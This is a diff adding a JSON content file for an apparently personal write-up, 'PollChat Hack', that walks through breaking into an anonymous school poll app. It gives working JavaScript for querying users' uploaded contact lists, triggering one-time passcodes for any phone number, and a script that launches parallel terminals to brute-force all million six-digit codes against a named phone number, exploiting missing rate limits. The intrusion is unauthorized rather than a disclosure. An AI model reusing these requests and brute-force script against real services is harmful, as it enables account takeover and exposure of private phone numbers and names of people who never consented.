@@ -1,0 +1,84 @@
+[
+    {
+        "title": "PollChat Hack",
+        "version": "1.0.0"
+    },
+    {
+        "description": "PollChat is a anonymous poll application that allows users to create polls and vote on them, anonymously. with this nature of anonymity it brings an obvious problem of bullying and harassment. This document will walk you through you my thought process of hacking into the app and retrieving user unaccessible information. "
+    },
+    {
+        "label": "01/23/2025"
+    },
+    {
+        "text": "The app had just gotten out and people from my school where already creating polls, but it was not long until I saw the first poll that was clearly made to slander someone. I became curious, and started to look into what network traffic the app was sending and receiving. I try and stay respectful but the authentication handling on the server end was mad of complete garbage. I was able to get a hold of my own JWT token and started to look into the API calls the app was making, replicating and adjusting them."
+    },
+    {
+        "smallLabel": "Example of a API call:"
+    },
+    {
+        "codeSnippet": {
+            "type": "javascript",
+            "data": "const url = \"https://api.poll.chat\";\nconst headers = {\n    //miscellaneous headers\n    authorization: \"Bearer example123456\",\n};\n\nconst response = await fetch(url, {\n    method: \"POST\",\n    headers: headers,\n    body: JSON.stringify({\n        query: \"query { contactsList { phone, firstName, lastName }}\",\n    }),\n});\n\n/* example response\n[\n  {\n    \"phone\": \"+12345678910\",\n    \"firstName\": \"john\",\n    \"lastName\": \"doe\"\n  },\n...\n],\n*/\n"
+        }
+    },
+    {
+        "smallLabel": "Whats going on?"
+    },
+    {
+        "text": "This is just a simple API call given the JWT token, the server will respond with the users \"me\" contacts list. But when did we give the server all of our contacts information? When we first downloaded the app it wouldnt let us in unless we gave access to our contacts to \"verify\" that you go to the school you selected, this information is stored on the server for some reason and can be retrieved with a simple API call. so far though its secure needing proper authorization to access."
+    },
+    {
+        "label": "01/24/2025"
+    },
+    {
+        "text": "Coming up on the second day i still have not found a way to get the information of other users, but i have found a way to get the information of the user that is currently logged in. I have found a way to get the JWT token of a user by login in currently at the time just myself"
+    },
+    {
+        "smallLabel": "But wait!"
+    },
+    {
+        "codeSnippet": {
+            "type": "javascript",
+            "data": "const url = \"https://auth.poll.chat\";\nconst headers = {\n    //miscellaneous headers\n};\n\nconst response = await fetch(url, {\n    method: \"POST\",\n    headers: headers,\n    body: JSON.stringify({\n        operationName: \"GenerateLoginCode\",\n        query: \"mutation GenerateLoginCode($phone: String!) { generateLoginCode(phone: $phone) }\",\n        variables: {\n            phone: \"(317) 734-4177\",\n        },\n    }),\n});\n\n/* example\n{\n  \"data\": {\n    \"generateLoginCode\": true\n  }\n}\n*/\n"
+        }
+    },
+    {
+        "smallLabel": "Whats this?"
+    },
+    {
+        "text": "Digging deeper into the apps API calls i noticed a different server that was used for authentication \"auth.poll.chat\",  this server was not as secure as the \"API\" server. I was able to send a six digit one time passcode to any phone number registered or not, in one minute intervals, the rate limiting on the OTP codes was not of concern to me as i would be exploiting a different vulnerability as well as the this one together. ->"
+    },
+    {
+        "smallLabel": "Exploiting the vulnerability"
+    },
+    {
+        "label": "01/26/2025"
+    },
+    {
+        "codeSnippet": {
+            "type": "javascript",
+            "data": "const url = \"https://auth.poll.chat\";\nconst headers = {\n    //miscellaneous headers\n};\n\nconst response = fetch(`https://auth.poll.chat`, {\n    method: \"POST\",\n    headers: HEADERS,\n    body: JSON.stringify({\n        query: `mutation { \n   login(phone: \"12345678910\", code: \"123456\") \n  }`,\n    }),\n});\n\n/* successful example\n{\n  \"data\": {\n    \"login\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3M....\"\n  }\n}\n*/\n\n/* non successful example\n{\n  errors: [\n    {\n      message: 'login expired or does not exist, please check your number and code',\n      locations: [Array],\n      path: [Array],\n      extensions: [Object]\n    }\n  ],\n  data: null\n}\n*/\n"
+        }
+    },
+    {
+        "smallLabel": "We in this shit!"
+    },
+    {
+        "text": "The above code snippet is an example of a simple login attempt, once a user sends themselves a OTP \"shown in previous snippet \" they then insert the code into the apps login page and the server will respond with a JWT token that can be used to access the API server and the corresponding data. With access to these functions without the logistics of the app limiting us we are able to exploit the fact that the server does not remove or change the login code after a set number of failed login attempts, And get this... does not rate limit API calls to its auth server!  "
+    },
+    {
+        "text": "Essentially, i am able to artificially generate a login code for a phone number of a user i think has the app, and then send a minimum of 0 requests and a maximum of one million requests to guess the login code. The hard work is done and it has now just turned into a long waiting game. The biggest downside of the operation is that we are unable to know if a phone number has a account or not before we start the guessing game. so one bad phone number could waste upwards of 20 - 120 minutes of our time. So i compromised and made a script that would start five terminals, all sending requests to the server with interval code guesses given a set range and constant phone number. This would allow me to guess 1 million codes in 30 minutes. maximum."
+    },
+    {
+        "smallLabel": "Script master"
+    },
+    {
+        "codeSnippet": {
+            "type": "javascript",
+            "data": "import { exec } from \"child_process\";\nimport fs from \"fs\";\n\nconst numTerminals = 5;\nconst batchSize = 200000; // How much each batch increases\nconst phoneNumber = \"317 734 4177\"; // Phone number parameter\n\nfor (let i = 0; i < numTerminals; i++) {\n    let startRange = i * batchSize;\n    const endRange = (i + 1) * batchSize;\n    const command = `osascript -e 'tell app \"Terminal\" to do script \"node /Users/${user}/Desktop/pollchat/sender.js 50 ${(startRange)} ${endRange} \\\\\"${phoneNumber}\\\\\"\"'`;\n    exec(command, (error) => {\n        if (error) {\n            console.error(`Error opening terminal ${i + 1}:`, error);\n        } else {\n            console.log(\n                `Terminal ${i + 1} started: Range ${startRange} - ${endRange}`\n            );\n        }\n    });\n}\n"
+        }
+    },
+    {
+        "text":"low-key cant think of anything else to write, and i will not be showcasing the sender.js file but i would assume you can imagine what it does."
+    }
+]
